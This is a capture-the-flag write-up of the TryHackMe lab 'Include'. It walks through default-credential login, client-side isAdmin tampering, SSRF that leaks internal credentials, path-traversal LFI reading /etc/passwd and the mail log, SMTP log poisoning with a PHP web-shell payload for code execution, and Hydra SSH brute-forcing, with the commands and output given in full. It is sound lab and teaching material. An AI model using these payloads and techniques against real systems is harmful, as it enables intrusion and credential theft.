# Include — TryHackMe Writeup

A walkthrough of **Include**, a web-focused pentesting challenge on TryHackMe. The box chains weak default credentials, client-side privilege tampering (IDOR-style role escalation), Server-Side Request Forgery (SSRF) against an internal admin API, Local File Inclusion, SMTP log poisoning for code execution, and SSH credential brute-forcing to progress from an unauthenticated login page to shell access and the first user's flag.

---

## Table of Contents

- [Machine Information](#machine-information)
- [Scenario](#scenario)
- [Reconnaissance](#reconnaissance)
  - [Full Port Scan](#full-port-scan)
  - [Service and Version Detection](#service-and-version-detection)
- [Initial Access](#initial-access)
  - [Default Credential Login](#default-credential-login)
  - [Privilege Escalation via Profile Tampering](#privilege-escalation-via-profile-tampering)
- [Admin Panel Exploitation](#admin-panel-exploitation)
  - [Discovering the Admin API](#discovering-the-admin-api)
  - [SSRF to Internal Services](#ssrf-to-internal-services)
  - [First Flag](#first-flag)
- [Further Exploitation](#further-exploitation)
  - [Local File Inclusion](#local-file-inclusion)
  - [User Enumeration via /etc/passwd](#user-enumeration-via-etcpasswd)
  - [SMTP Log Poisoning for Code Execution](#smtp-log-poisoning-for-code-execution)
  - [SSH Credential Brute-Forcing](#ssh-credential-brute-forcing)
- [Shell Access](#shell-access)
- [Summary](#summary)

---

## Machine Information

| Property | Value |
|---|---|
| Platform | TryHackMe |
| Category | Web Pentesting |
| OS | Linux |
| Target IP | `10.48.128.174` |
| Hostname | `mail.filepath.lab` |

---

## Scenario

This challenge was presented as an initial assessment of web pentesting capability, with a focus on server-side attacks. The stated objective was to determine whether flags could be captured and a secret admin panel reached, even where that panel was not directly accessible from the browser.

---

## Reconnaissance

### Full Port Scan

An initial all-port Nmap scan was run against the target to identify open services.

```text
Nmap scan report for ip-10-48-128-174.ap-south-1.compute.internal (10.48.128.174)
Host is up, received reset ttl 64 (0.00036s latency).
Scanned at 2026-11-28 03:33:53 UTC for 3s
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE        REASON
22/tcp    open  ssh            syn-ack ttl 64
25/tcp    open  smtp           syn-ack ttl 64
110/tcp   open  pop3           syn-ack ttl 64
143/tcp   open  imap           syn-ack ttl 64
993/tcp   open  imaps          syn-ack ttl 64
995/tcp   open  pop3s          syn-ack ttl 64
4000/tcp  open  remoteanything syn-ack ttl 64
50000/tcp open  ibm-db2        syn-ack ttl 64
```

### Service and Version Detection

A follow-up scan with service and version detection was run to fingerprint each open port.

```text
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     syn-ack ttl 64 Postfix smtpd
|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
110/tcp   open  pop3     syn-ack ttl 64 Dovecot pop3d
143/tcp   open  imap     syn-ack ttl 64 Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap syn-ack ttl 64 Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 syn-ack ttl 64 Dovecot pop3d
4000/tcp  open  http     syn-ack ttl 64 Node.js (Express middleware)
|_http-title: Sign In
50000/tcp open  http     syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: System Monitoring Portal
Service Info: Host: mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Key findings:

- **SSH** — `OpenSSH 8.2p1` on Ubuntu.
- **Mail services** — Postfix (SMTP), Dovecot (POP3/IMAP), later used for log poisoning.
- **Port 4000** — a Node.js/Express application presenting a "Sign In" page.
- **Port 50000** — an Apache/PHP "System Monitoring Portal", with the `PHPSESSID` cookie missing the `httponly` flag.

---

## Initial Access

### Default Credential Login

The web application on port 4000 was tested with Burp Suite in the loop. Common weak credentials were tried against the login form, and `guest:guest` succeeded, granting access to a standard guest profile.

### Privilege Escalation via Profile Tampering

On the profile activity page, the application exposed an `isAdmin` field that was editable from the client side. By modifying this field and resending the profile update request, `isAdmin` was set to `true`, elevating the guest session to administrative privileges within the application.

With admin privileges granted, an internal endpoint became reachable:

```
http://10.48.128.174:4000/admin/api
```

This surfaced references to internal ports and pages tied to web-admin and regular user functionality.

---

## Admin Panel Exploitation

### Discovering the Admin API

Exploring the admin panel further, a "Settings" section included a profile banner update feature that accepted a URL. Supplying an internal-looking URL here immediately indicated an SSRF vulnerability, since the application fetched and reflected the response from the target URL.

### SSRF to Internal Services

The admin API hinted at internal ports used for administrative functionality. An internal endpoint was requested through the SSRF vector:

```
http://127.0.0.1:5000/getAllAdmins101099991
```

The response disclosed credentials for internal applications:

```json
{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
```

The same payload, base64-encoded:

```text
eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAh
ISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29y
ZCI6IlMkOSRxazZkIyoqTFFVIn0=
```

### First Flag

Using the disclosed credentials against the relevant internal application yielded the first flag for the challenge.

---

## Further Exploitation

### Local File Inclusion

Reviewing the page source of the System Monitoring Portal (port 50000) revealed an image parameter that looked like a potential Local File Inclusion vector:

```html
<img src="profile.php?img=profile.png">
```

The parameter's handling appeared obfuscated, reinforcing the suspicion of an LFI vulnerability. `ffuf` was used to brute-force further paths and parameter behavior around this endpoint.

### User Enumeration via /etc/passwd

Path traversal was used against the vulnerable parameter to read `/etc/passwd`:

```
http://10.48.128.174:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

This disclosed two local user accounts of interest:

```text
/home/joshua:/bin/bash
charles:x:1003:1003:,,,:/home/charles:/bin/bash
```

### SMTP Log Poisoning for Code Execution

With LFI confirmed, the same traversal path was used to read the mail log, which grows quickly and is attacker-influenceable via SMTP:

```
http://10.48.128.174:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/mail.log
```

A PHP payload was injected into the mail log by supplying it as part of an SMTP session:

```bash
telnet 10.48.128.174 25
```

```text
Trying 10.48.128.174...
Connected to 10.48.128.174.
Escape character is '^]'.
220 mail.filepath.lab ESMTP Postfix (Ubuntu)
MAIL FROM: naval.thm
250 2.1.0 Ok
RCPT TO:<?php system($_GET['cmd']); ?>
501 5.1.3 Bad recipient address syntax
```

Despite the `501` response from Postfix, the attempted payload was still written into the mail log, which the earlier LFI vulnerability could then include and execute. Passing a command through the LFI path confirmed code execution:

```
profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/mail.log&cmd=whoami
```

This returned `www-data`, confirming remote code execution as the web server user via SMTP log poisoning combined with the LFI vulnerability.

### SSH Credential Brute-Forcing

Rather than continuing to rely on log poisoning for further command execution, SSH access was pursued directly using the two usernames identified earlier (`joshua` and `charles`), brute-forced with Hydra against the `rockyou.txt` wordlist.

```bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://10.48.128.174
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-28 04:27:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688796 login tries (l:2/p:14344398), ~1793050 tries per task
[DATA] attacking ssh://10.48.128.174:22/
[22][ssh] host: 10.48.128.174   login: charles   password: 123456
[22][ssh] host: 10.48.128.174   login: joshua   password: 123456
```

Both accounts were found to use the weak password `123456`.

---

## Shell Access

The recovered `charles` credentials were used to authenticate over SSH, providing a stable shell on the host and access to the web application's source directory.

```bash
charles@ip-10-48-128-174:/var/www/html$ ls
```

```text
505eb0fb8a9f32853b4d955e1f9123ea.txt  index.php    templates
api.php                               login.php    uploads
auth.php                              logout.php
dashboard.php                         profile.php
```

A uniquely named text file in the web root was read directly:

```bash
charles@ip-10-48-128-174:/var/www/html$ cat 505eb0fb8a9f32853b4d955e1f9123ea.txt
```

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap full port scan and service/version detection |
| Initial Access | Default credential login, client-side privilege (`isAdmin`) tampering |
| Admin Exploitation | Admin API discovery, SSRF to internal services, credential disclosure |
| Further Exploitation | Local File Inclusion, `/etc/passwd` user enumeration, SMTP log poisoning for RCE |
| Credential Access | SSH brute-forcing with Hydra against enumerated usernames |

**Attack chain overview:**

1. A Node.js login portal on port 4000 was accessed using the default credentials `guest:guest`.
2. An editable `isAdmin` field on the guest profile was tampered with to escalate the session to administrator privileges.
3. The elevated session exposed an internal admin API, which in turn revealed an SSRF vulnerability in a profile-banner URL field.
4. The SSRF vector was used to reach an internal-only endpoint, disclosing credentials for internal review and system-monitoring applications and yielding the first flag.
5. The System Monitoring Portal on port 50000 was found vulnerable to Local File Inclusion via an image parameter, which was used to read `/etc/passwd` and enumerate local usernames.
6. SMTP was abused to poison the mail log with a PHP payload, which the LFI vulnerability then included and executed, confirming remote code execution as `www-data`.
7. Rather than continuing with log-poisoning-based execution, the enumerated usernames were brute-forced against SSH with Hydra, recovering weak passwords for both accounts and providing a stable foothold on the host.

---

# Jai Shri Ram
